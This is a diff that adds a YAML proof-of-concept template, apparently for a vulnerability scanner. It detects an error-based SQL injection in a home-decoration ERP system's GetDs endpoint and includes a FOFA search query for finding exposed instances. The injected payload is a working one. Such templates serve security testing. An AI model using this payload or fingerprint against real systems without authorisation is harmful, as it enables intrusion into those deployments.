@@ -1,0 +1,20 @@
+id: poc-yaml-znfit-erp-ms-getds-sqli
+info:
+  name: 家装ERP管理系统 GetDs SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ERP管理系统
+  fofa: body="上海装盟信息科技有限公司"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /WEB_SERVICE/Public.asmx/GetDs
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: tbName=sysusers&where=uid='1'+AND+1=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--'
+  expression: status_code == 500 && contains(body,"在将 nvarchar 值") && contains(body,"0x"
+    + t2) && contains(body,"转换成数据类型 int 时失败") && !contains(body,"<")
+transport: http
